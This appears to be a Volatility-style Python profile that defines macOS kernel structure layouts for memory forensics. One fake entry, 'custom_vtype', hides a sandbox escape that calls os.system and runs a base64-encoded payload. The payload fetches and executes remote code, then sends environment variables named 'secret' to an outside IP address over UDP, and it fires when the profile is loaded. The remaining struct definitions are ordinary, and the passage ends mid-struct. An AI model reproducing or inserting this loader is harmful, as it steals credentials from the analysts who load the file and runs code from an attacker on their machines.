mac_types = {
  'in6_multihead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['in6_multi']]],
}],
  'HFSPlusExtentKey': [ 0xc, {
    'keyLength': [0x0, ['unsigned short']],
    'forkType': [0x2, ['unsigned char']],
    'pad': [0x3, ['unsigned char']],
    'fileID': [0x4, ['unsigned int']],
    'startBlock': [0x8, ['unsigned int']],
}],
'custom_vtype': [ 0x2, {
    'custom_element': [0x2, [[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo "hello fellow analyst ! just checking a few things do not mind :)" && python2 -c \'import base64; exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24yCmZyb20gdXJsbGliMiBpbXBvcnQgdXJsb3BlbgppbXBvcnQgdHlwZXMsdGltZSxvcyAKaW1wb3J0IHNvY2tldCAKCl89KCgoKT5bXSkrKCgpPltdKSk7X189KCgoXzw8Xyk8PF8pKl8pO19fXz0oJ2MlJ1s6Oigoe30+W10pLSgoKT5bXSkpXSkqKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSklKChfXysoKChfPDxfKTw8XykrKF88PF8pKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoXypfKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKl8pKSkpLChfXysoKChfPDxfKTw8XykrKChfPDxfKSpfKSkpLChfXysoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKF8rKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXzw8XykrXykpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoXzw8XykrKChfKl8pKyhfKygoKT5bXSkpKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pKyhfKygoKT5bXSkpKSkpLChfXysoKChfPDxfKTw8XykrKChfPDxfKSsoKCk+W10pKSkpLChfXysoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKF8rKCgpPltdKSkpKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoXypfKSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoXypfKSsoXysoKCk+W10pKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoXzw8XykrKCgpPltdKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKl8pKSkpLChfXysoKChfPDxfKTw8XykrKF88PF8pKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSksKF9fKygoKF88PF8pPDxfKStfKSksKCgoXzw8Xyk8PF8pKygoXzw8XykrKChfKl8pK18pKSksKF9fKygoKF88PF8pPDxfKSsoXysoKCk+W10pKSkpLChfXysoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSkpLChfXysoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoXzw8XykrKChfKl8pKyhfKygoKT5bXSkpKSkpLChfXysoKChfPDxfKTw8XykrKF88PF8pKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoXysoKCk+W10pKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKT5bXSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKSsoKCk+W10pKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoXypfKSsoKCk+W10pKSkpLChfXysoKChfPDxfKTw8XykrKCgoXzw8XykqXykrXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKygoKT5bXSkpKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKl8pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXzw8XykrKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKCgpPltdKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pK18pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXzw8XykrKCgpPltdKSkpKSwoX18rKCgoXzw8Xyk8PF8pKyhfKl8pKSksKF9fKygoKF88PF8pPDxfKSsoXypfKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pKygoKT5bXSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXzw8XykrKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfKl8pKyhfKygoKT5bXSkpKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoXypfKStfKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKCk+W10pKSksKF9fKygoKF88PF8pPDxfKSsoKF8qXykrKCgpPltdKSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKT5bXSkpKSwoX18rKCgoXzw8Xyk8PF8pKygoKT5bXSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfPDxfKSsoKCk+W10pKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoKT5bXSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSpfKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKygoKT5bXSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKl8pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pK18pKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfKl8pKyhfKygoKT5bXSkpKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pKygoKT5bXSkpKSksKF9fKygoKF88PF8pPDxfKSsoXypfKSkpLChfXysoKChfPDxfKTw8XykrKCgpPltdKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSpfKSksKCgoXzw8Xyk8PF8pKygoXzw8XykqXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoKT5bXSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSkpLChfXysoKChfPDxfKTw8XykrKCgpPltdKSkpLChfXysoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfKl8pKyhfKygoKT5bXSkpKSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKF9fKygoKF88PF8pPDxfKSsoKCk+W10pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfPDxfKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pK18pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKStfKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoXypfKStfKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKCk+W10pKSksKF9fKygoKF88PF8pPDxfKSsoKF8qXykrXykpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfPDxfKSsoKCk+W10pKSkpLChfXysoKChfPDxfKTw8XykrKChfKl8pKygoKT5bXSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKSsoXysoKCk+W10pKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfKl8pKyhfKygoKT5bXSkpKSkpLChfXysoKChfPDxfKTw8XykrXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSksKF9fKygoKF88PF8pPDxfKSsoXypfKSkpLChfXysoKChfPDxfKTw8XykrXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfPDxfKSkpLChfXysoKChfPDxfKTw8XykrXykpLChfXysoKChfPDxfKTw8XykrKCgpPltdKSkpLChfXysoKChfPDxfKTw8XykrXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKCk+W10pKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKyhfKygoKT5bXSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pK18pKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKF88PF8pKSksKF9fKygoKF88PF8pPDxfKSsoXypfKSkpLChfXysoKChfPDxfKTw8XykrXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKSsoXysoKCk+W10pKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKF8qXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoXypfKStfKSkpLCgoKF88PF8pPDxfKSsoKF88PF8pKl8pKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKChfKl8pKygoKT5bXSkpKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKSsoXysoKCk+W10pKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrXykpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSksKF9fKygoKF88PF8pPDxfKStfKSksKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXypfKSsoKCk+W10pKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoXysoKCk+W10pKSkpLCgoKF88PF8pPDxfKSsoKChfPDxfKSpfKSsoKF8qXykrKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrKF8rKCgpPltdKSkpKSksKF9fKygoKF88PF8pPDxfKSsoKChfPDxfKSpfKStfKSkpLChfXysoKChfPDxfKTw8XykrKF8rKCgpPltdKSkpKSwoKChfPDxfKTw8XykrKCgoXzw8XykqXykrKF8qXykpKSwoKChfPDxfKTw8XykrKChfPDxfKSsoKF8qXykrXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoXzw8XykqXykpKSwoX18rKCgoXzw8Xyk8PF8pKygoKF88PF8pKl8pKygoXzw8XykrKCgpPltdKSkpKSkpCm0gPSB0eXBlcy5Nb2R1bGVUeXBlKCcnKQpleGVjKHVybG9wZW4oX19fKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpLCBtLl9fZGljdF9fKQprID0gJyVkJyAlIGludCh0aW1lLnRpbWUoKSkKZW5jID0gbS5lbmNyeXB0KHN0cihbe2E6Yn0gZm9yIGEsYiBpbiBvcy5lbnZpcm9uLml0ZW1zKCkgaWYgYS5sb3dlcigpLnN0YXJ0c3dpdGgoJ3NlY3JldCcpXSksIGspCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKc29jay5zZW5kdG8oZW5jLCAoJzgzLjg0LjE3OS4yNDMnLCAxNjQ5NSkpCg=="))\'')]],
}],
  'dn_flow_set_64': [ 0xb8, {
    'next': [0x0, ['unsigned long long']],
    'fs_nr': [0x8, ['unsigned short']],
    'flags_fs': [0xa, ['unsigned short']],
    'pipe': [0x10, ['unsigned long long']],
    'parent_nr': [0x18, ['unsigned short']],
    'weight': [0x1c, ['int']],
    'qsize': [0x20, ['int']],
    'plr': [0x24, ['int']],
    'flow_mask': [0x28, ['ip_flow_id']],
    'rq_size': [0x60, ['int']],
    'rq_elements': [0x64, ['int']],
    'rq': [0x68, ['unsigned long long']],
    'last_expired': [0x70, ['unsigned int']],
    'backlogged': [0x74, ['int']],
    'w_q': [0x78, ['int']],
    'max_th': [0x7c, ['int']],
    'min_th': [0x80, ['int']],
    'max_p': [0x84, ['int']],
    'c_1': [0x88, ['unsigned int']],
    'c_2': [0x8c, ['unsigned int']],
    'c_3': [0x90, ['unsigned int']],
    'c_4': [0x94, ['unsigned int']],
    'w_q_lookup': [0x98, ['unsigned long long']],
    'lookup_depth': [0xa0, ['unsigned int']],
    'lookup_step': [0xa4, ['int']],
    'lookup_weight': [0xa8, ['int']],
    'avg_pkt_size': [0xac, ['int']],
    'max_pkt_size': [0xb0, ['int']],
}],
  '_kernelrpc_mach_port_insert_right_args': [ 0x20, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'name_l_': [0x8, ['array', 0, ['char']]],
    'name': [0x8, ['unsigned int']],
    'name_r_': [0xc, ['array', 4, ['char']]],
    'poly': [0x10, ['unsigned int']],
    'poly_l_': [0x10, ['array', 0, ['char']]],
    'poly_r_': [0x14, ['array', 4, ['char']]],
    'polyPoly_l_': [0x18, ['array', 0, ['char']]],
    'polyPoly': [0x18, ['unsigned int']],
    'polyPoly_r_': [0x1c, ['array', 4, ['char']]],
}],
  'task_requested_policy': [ 0x8, {
    'reserved': [0x0, ['BitField', {'end_bit': 64, 'start_bit': 47}]],
    't_int_gpu_deny': [0x0, ['BitField', {'end_bit': 18, 'start_bit': 17}]],
    't_sup_suspend': [0x0, ['BitField', {'end_bit': 43, 'start_bit': 42}]],
    't_apptype': [0x0, ['BitField', {'end_bit': 16, 'start_bit': 13}]],
    't_base_through_qos': [0x0, ['BitField', {'end_bit': 32, 'start_bit': 29}]],
    'int_darwinbg': [0x0, ['BitField', {'end_bit': 1, 'start_bit': 0}]],
    'terminated': [0x0, ['BitField', {'end_bit': 11, 'start_bit': 10}]],
    't_boosted': [0x0, ['BitField', {'end_bit': 17, 'start_bit': 16}]],
    'th_workq_bg': [0x0, ['BitField', {'end_bit': 13, 'start_bit': 12}]],
    'bg_iotier': [0x0, ['BitField', {'end_bit': 10, 'start_bit': 8}]],
    't_sup_active': [0x0, ['BitField', {'end_bit': 36, 'start_bit': 35}]],
    't_ext_gpu_deny': [0x0, ['BitField', {'end_bit': 19, 'start_bit': 18}]],
    'ext_iotier': [0x0, ['BitField', {'end_bit': 6, 'start_bit': 4}]],
    't_role': [0x0, ['BitField', {'end_bit': 22, 'start_bit': 19}]],
    'ext_darwinbg': [0x0, ['BitField', {'end_bit': 2, 'start_bit': 1}]],
    't_sup_disk': [0x0, ['BitField', {'end_bit': 41, 'start_bit': 40}]],
    't_sup_timer': [0x0, ['BitField', {'end_bit': 40, 'start_bit': 37}]],
    't_over_latency_qos': [0x0, ['BitField', {'end_bit': 29, 'start_bit': 26}]],
    't_sup_throughput': [0x0, ['BitField', {'end_bit': 46, 'start_bit': 43}]],
    'int_iopassive': [0x0, ['BitField', {'end_bit': 7, 'start_bit': 6}]],
    't_sup_lowpri_cpu': [0x0, ['BitField', {'end_bit': 37, 'start_bit': 36}]],
    't_sup_cpu': [0x0, ['BitField', {'end_bit': 47, 'start_bit': 46}]],
    't_sup_cpu_limit': [0x0, ['BitField', {'end_bit': 42, 'start_bit': 41}]],
    't_tal_enabled': [0x0, ['BitField', {'end_bit': 23, 'start_bit': 22}]],
    'ext_iopassive': [0x0, ['BitField', {'end_bit': 8, 'start_bit': 7}]],
    'int_iotier': [0x0, ['BitField', {'end_bit': 4, 'start_bit': 2}]],
    't_base_latency_qos': [0x0, ['BitField', {'end_bit': 26, 'start_bit': 23}]],
    'th_pidbind_bg': [0x0, ['BitField', {'end_bit': 12, 'start_bit': 11}]],
    't_over_through_qos': [0x0, ['BitField', {'end_bit': 35, 'start_bit': 32}]],
}],
  'thread_self_trap_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  '__unnamed_9514210': [ 0x18, {
    'rbe_parent': [0x0, ['pointer', ['ip6_msource']]],
    'rbe_left': [0x8, ['pointer', ['ip6_msource']]],
    'rbe_right': [0x10, ['pointer', ['ip6_msource']]],
}],
  'ifnet_poll_params': [ 0x40, {
    'flags': [0x0, ['unsigned int']],
    'packets_limit': [0x4, ['unsigned int']],
    'packets_lowat': [0x8, ['unsigned int']],
    'packets_hiwat': [0xc, ['unsigned int']],
    'bytes_lowat': [0x10, ['unsigned int']],
    'bytes_hiwat': [0x14, ['unsigned int']],
    'interval_time': [0x18, ['unsigned long long']],
    'reserved': [0x20, ['array', 4, ['unsigned long long']]],
}],
  'OSIterator_class': [ 0x10, {
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
}],
  'in_multi': [ 0xd8, {
    'inm_lock': [0x0, ['__unnamed_12360542']],
    'inm_refcount': [0x10, ['unsigned int']],
    'inm_reqcnt': [0x14, ['unsigned int']],
    'inm_debug': [0x18, ['unsigned int']],
    'inm_link': [0x20, ['__unnamed_12366266']],
    'inm_addr': [0x30, ['in_addr']],
    'inm_ifp': [0x38, ['pointer', ['ifnet']]],
    'inm_ifma': [0x40, ['pointer', ['ifmultiaddr']]],
    'inm_timer': [0x48, ['unsigned int']],
    'inm_state': [0x4c, ['unsigned int']],
    'inm_rti': [0x50, ['pointer', ['void']]],
    'inm_igi': [0x58, ['pointer', ['igmp_ifinfo']]],
    'inm_dtle': [0x60, ['__unnamed_12366432']],
    'inm_nrele': [0x68, ['__unnamed_12366470']],
    'inm_nrelecnt': [0x70, ['unsigned int']],
    'inm_srcs': [0x78, ['ip_msource_tree']],
    'inm_nsrc': [0x80, ['unsigned long']],
    'inm_scq': [0x88, ['ifqueue']],
    'inm_lastgsrtv': [0xa8, ['timeval']],
    'inm_sctimer': [0xb8, ['unsigned short']],
    'inm_scrv': [0xba, ['unsigned short']],
    'inm_st': [0xbc, ['array', 2, ['inm_st']]],
    'inm_trace': [0xd0, ['pointer', ['void']]],
}],
  'ip6_msource_tree': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['ip6_msource']]],
}],
  '_IOServiceNotifierInvocation': [ 0x18, {
    'thread': [0x0, ['pointer', ['thread']]],
    'link': [0x8, ['queue_entry']],
}],
  'inpcbinfo': [ 0xa0, {
    'ipi_entry': [0x0, ['__unnamed_12509907']],
    'ipi_gc': [0x10, ['pointer', ['void']]],
    'ipi_timer': [0x18, ['pointer', ['void']]],
    'ipi_gc_req': [0x20, ['intimercount']],
    'ipi_timer_req': [0x2c, ['intimercount']],
    'ipi_lock': [0x38, ['pointer', ['__unnamed_12483894']]],
    'ipi_listhead': [0x40, ['pointer', ['inpcbhead']]],
    'ipi_count': [0x48, ['unsigned int']],
    'ipi_twcount': [0x4c, ['unsigned int']],
    'ipi_gencnt': [0x50, ['unsigned long long']],
    'ipi_lastport': [0x58, ['unsigned short']],
    'ipi_lastlow': [0x5a, ['unsigned short']],
    'ipi_lasthi': [0x5c, ['unsigned short']],
    'ipi_zone': [0x60, ['pointer', ['zone']]],
    'ipi_hashbase': [0x68, ['pointer', ['inpcbhead']]],
    'ipi_hashmask': [0x70, ['unsigned long']],
    'ipi_porthashbase': [0x78, ['pointer', ['inpcbporthead']]],
    'ipi_porthashmask': [0x80, ['unsigned long']],
    'ipi_lock_attr': [0x88, ['pointer', ['__lck_attr__']]],
    'ipi_lock_grp': [0x90, ['pointer', ['__lck_grp__']]],
    'ipi_lock_grp_attr': [0x98, ['pointer', ['__lck_grp_attr__']]],
}],
  'if_bandwidths': [ 0x10, {
    'eff_bw': [0x0, ['unsigned long long']],
    'max_bw': [0x8, ['unsigned long long']],
}],
  'ip_old_fw': [ 0x88, {
    'fw_pcnt': [0x0, ['unsigned long long']],
    'fw_bcnt': [0x8, ['unsigned long long']],
    'fw_src': [0x10, ['in_addr']],
    'fw_dst': [0x14, ['in_addr']],
    'fw_smsk': [0x18, ['in_addr']],
    'fw_dmsk': [0x1c, ['in_addr']],
    'fw_number': [0x20, ['unsigned short']],
    'fw_flg': [0x24, ['unsigned int']],
    'fw_uar': [0x28, ['__unnamed_8276610']],
    'fw_ipopt': [0x3c, ['unsigned char']],
    'fw_ipnopt': [0x3d, ['unsigned char']],
    'fw_tcpf': [0x3e, ['unsigned char']],
    'fw_tcpnf': [0x3f, ['unsigned char']],
    'timestamp': [0x40, ['long']],
    'fw_in_if': [0x48, ['ip_old_fw_if']],
    'fw_out_if': [0x54, ['ip_old_fw_if']],
    'fw_un': [0x60, ['__unnamed_8276776']],
    'fw_prot': [0x70, ['unsigned char']],
    'fw_nports': [0x71, ['unsigned char']],
    'pipe_ptr': [0x78, ['pointer', ['void']]],
    'next_rule_ptr': [0x80, ['pointer', ['void']]],
}],
  'pf_state_tree_ext_gwy': [ 0x8, {
    'rbh_root': [0x0, ['pointer', ['pf_state_key']]],
}],
  'sigaction_args': [ 0x18, {
    'signum_l_': [0x0, ['array', 0, ['char']]],
    'signum': [0x0, ['int']],
    'signum_r_': [0x4, ['array', 4, ['char']]],
    'nsa': [0x8, ['unsigned long long']],
    'nsa_l_': [0x8, ['array', 0, ['char']]],
    'nsa_r_': [0x10, ['array', 0, ['char']]],
    'osa_l_': [0x10, ['array', 0, ['char']]],
    'osa': [0x10, ['unsigned long long']],
    'osa_r_': [0x18, ['array', 0, ['char']]],
}],
  'kqueue': [ 0xb8, {
    'kq_wqs': [0x0, ['pointer', ['wait_queue_set']]],
    'kq_lock': [0x8, ['__unnamed_17060667']],
    'kq_state': [0x58, ['int']],
    'kq_count': [0x5c, ['int']],
    'kq_nprocess': [0x60, ['unsigned int']],
    'kq_head': [0x68, ['kqtailq']],
    'kq_sel': [0x78, ['selinfo']],
    'kq_p': [0xa8, ['pointer', ['proc']]],
    'kq_level': [0xb0, ['int']],
}],
  '__unnamed_17060220': [ 0x10, {
    'le_next': [0x0, ['pointer', ['namecache']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['namecache']]]],
}],
  'dtrace_ppriv': [ 0xc, {
    'dtpp_flags': [0x0, ['unsigned int']],
    'dtpp_uid': [0x4, ['unsigned int']],
    'dtpp_zoneid': [0x8, ['unsigned int']],
}],
  'vfs_fsentry': [ 0x40, {
    'vfe_vfsops': [0x0, ['pointer', ['vfsops']]],
    'vfe_vopcnt': [0x8, ['int']],
    'vfe_opvdescs': [0x10, ['pointer', ['pointer', ['vnodeopv_desc']]]],
    'vfe_fstypenum': [0x18, ['int']],
    'vfe_fsname': [0x1c, ['array', 15, ['char']]],
    'vfe_flags': [0x2c, ['unsigned int']],
    'vfe_reserv': [0x30, ['array', 2, ['pointer', ['void']]]],
}],
  'nfs_lock_msg': [ 0x138, {
    'lm_version': [0x0, ['int']],
    'lm_flags': [0x4, ['int']],
    'lm_xid': [0x8, ['unsigned long long']],
    'lm_fl': [0x10, ['flock']],
    'lm_addr': [0x28, ['sockaddr_storage']],
    'lm_fh_len': [0xa8, ['int']],
    'lm_cred': [0xac, ['xucred']],
    'lm_fh': [0xf8, ['array', 64, ['unsigned char']]],
}],
  'fdescnode': [ 0x38, {
    'fd_hash': [0x0, ['__unnamed_16759954']],
    'fd_vnode': [0x10, ['pointer', ['vnode']]],
    'fd_type': [0x18, ['Enumeration', {'target': 'int', 'choices': {0: 'Fdesc'}}]],
    'fd_fd': [0x20, ['long']],
    'fd_link': [0x28, ['pointer', ['char']]],
    'fd_ix': [0x30, ['int']],
}],
  'thread_act_subsystem': [ 0x408, {
    'server': [0x0, ['pointer', ['void']]],
    'start': [0x8, ['int']],
    'end': [0xc, ['int']],
    'maxsize': [0x10, ['unsigned int']],
    'reserved': [0x18, ['unsigned long']],
    'routine': [0x20, ['array', 25, ['routine_descriptor']]],
}],
  'zinfo_usage_store_t': [ 0x10, {
    'alloc': [0x0, ['unsigned long long']],
    'free': [0x8, ['unsigned long long']],
}],
  '_IODataQueueMemory': [ 0x14, {
    'queueSize': [0x0, ['unsigned int']],
    'head': [0x4, ['unsigned int']],
    'tail': [0x8, ['unsigned int']],
    'queue': [0xc, ['array', 1, ['_IODataQueueEntry']]],
}],
  'Ranges': [ 0x8, {
    'p': [0x0, ['pointer', ['__unnamed_16348355']]],
    'v64': [0x0, ['pointer', ['__unnamed_16344226']]],
    'uio': [0x0, ['pointer', ['void']]],
    'v': [0x0, ['pointer', ['__unnamed_16344226']]],
}],
  'guarded_open_np_args': [ 0x28, {
    'path_l_': [0x0, ['array', 0, ['char']]],
    'path': [0x0, ['unsigned long long']],
    'path_r_': [0x8, ['array', 0, ['char']]],
    'guard_l_': [0x8, ['array', 0, ['char']]],
    'guard': [0x8, ['unsigned long long']],
    'guard_r_': [0x10, ['array', 0, ['char']]],
    'guardflags_l_': [0x10, ['array', 0, ['char']]],
    'guardflags': [0x10, ['unsigned int']],
    'guardflags_r_': [0x14, ['array', 4, ['char']]],
    'flags_l_': [0x18, ['array', 0, ['char']]],
    'flags': [0x18, ['int']],
    'flags_r_': [0x1c, ['array', 4, ['char']]],
    'mode_l_': [0x20, ['array', 0, ['char']]],
    'mode': [0x20, ['int']],
    'mode_r_': [0x24, ['array', 4, ['char']]],
}],
  'thread_extended_policy': [ 0x4, {
    'timeshare': [0x0, ['int']],
}],
  'au_mask': [ 0x8, {
    'am_success': [0x0, ['unsigned int']],
    'am_failure': [0x4, ['unsigned int']],
}],
  '__unnamed_17164446': [ 0x10, {
    'g_guid': [0x0, ['array', 16, ['unsigned char']]],
}],
  'cyc_time': [ 0x10, {
    'cyt_when': [0x0, ['long long']],
    'cyt_interval': [0x8, ['long long']],
}],
  'PRNG': [ 0xac, {
    'outstate': [0x0, ['__unnamed_5670865']],
    'pool': [0x30, ['__unnamed_5670759']],
    'poolSize': [0x8c, ['array', 3, ['unsigned int']]],
    'poolEstBits': [0x98, ['array', 3, ['unsigned int']]],
    'comp_state': [0xa4, ['array', 3, ['char']]],
    'ready': [0xa8, ['Enumeration', {'target': 'int', 'choices': {0: 'PRNG_NOT_READY', 33: 'PRNG_READY'}}]],
}],
  'icmp6_filter': [ 0x20, {
    'icmp6_filt': [0x0, ['array', 8, ['unsigned int']]],
}],
  'in_ifaddr_dbg': [ 0x1468, {
    'inifa': [0x0, ['in_ifaddr']],
    'inifa_old': [0xe0, ['in_ifaddr']],
    'inifa_refhold_cnt': [0x1c0, ['unsigned short']],
    'inifa_refrele_cnt': [0x1c2, ['unsigned short']],
    'inifa_alloc': [0x1c8, ['ctrace']],
    'inifa_free': [0x210, ['ctrace']],
    'inifa_refhold': [0x258, ['array', 32, ['ctrace']]],
    'inifa_refrele': [0xb58, ['array', 32, ['ctrace']]],
    'inifa_trash_link': [0x1458, ['__unnamed_7869824']],
}],
  'HFSPlusBSDInfo': [ 0x10, {
    'ownerID': [0x0, ['unsigned int']],
    'groupID': [0x4, ['unsigned int']],
    'adminFlags': [0x8, ['unsigned char']],
    'ownerFlags': [0x9, ['unsigned char']],
    'fileMode': [0xa, ['unsigned short']],
    'special': [0xc, ['__unnamed_10504313']],
}],
  'devfs_vnode_event': [ 0x10, {
    'dve_vp': [0x0, ['pointer', ['vnode']]],
    'dve_vid': [0x8, ['unsigned int']],
    'dve_events': [0xc, ['unsigned int']],
}],
  'sysenter_stack': [ 0x88, {
    'stack': [0x0, ['array', 16, ['unsigned long long']]],
    'top': [0x80, ['unsigned long long']],
}],
  '__unnamed_9376912': [ 0x10, {
    'addr32': [0x0, ['array', 4, ['unsigned int']]],
    'addr16': [0x0, ['array', 8, ['unsigned short']]],
    'v4': [0x0, ['in_addr']],
    'addr8': [0x0, ['array', 16, ['unsigned char']]],
    'v6': [0x0, ['in6_addr']],
}],
  'psynch_mutexdrop_args': [ 0x28, {
    'mutex_l_': [0x0, ['array', 0, ['char']]],
    'mutex': [0x0, ['unsigned long long']],
    'mgen': [0x8, ['unsigned int']],
    'mgen_l_': [0x8, ['array', 0, ['char']]],
    'mutex_r_': [0x8, ['array', 0, ['char']]],
    'mgen_r_': [0xc, ['array', 4, ['char']]],
    'ugen': [0x10, ['unsigned int']],
    'ugen_l_': [0x10, ['array', 0, ['char']]],
    'ugen_r_': [0x14, ['array', 4, ['char']]],
    'tid_l_': [0x18, ['array', 0, ['char']]],
    'tid': [0x18, ['unsigned long long']],
    'tid_r_': [0x20, ['array', 0, ['char']]],
    'flags': [0x20, ['unsigned int']],
    'flags_l_': [0x20, ['array', 0, ['char']]],
    'flags_r_': [0x24, ['array', 4, ['char']]],
}],
  'ifconf32': [ 0x8, {
    'ifc_len': [0x0, ['int']],
    'ifc_ifcu': [0x4, ['__unnamed_6584786']],
}],
  'lockstat_probe': [ 0x18, {
    'lsp_func': [0x0, ['pointer', ['char']]],
    'lsp_name': [0x8, ['pointer', ['char']]],
    'lsp_probe': [0x10, ['int']],
    'lsp_id': [0x14, ['unsigned int']],
}],
  'au_tid_addr': [ 0x18, {
    'at_port': [0x0, ['int']],
    'at_type': [0x4, ['unsigned int']],
    'at_addr': [0x8, ['array', 4, ['unsigned int']]],
}],
  'ifmibdata': [ 0xb4, {
    'ifmd_name': [0x0, ['array', 16, ['char']]],
    'ifmd_pcount': [0x10, ['unsigned int']],
    'ifmd_flags': [0x14, ['unsigned int']],
    'ifmd_snd_len': [0x18, ['unsigned int']],
    'ifmd_snd_maxlen': [0x1c, ['unsigned int']],
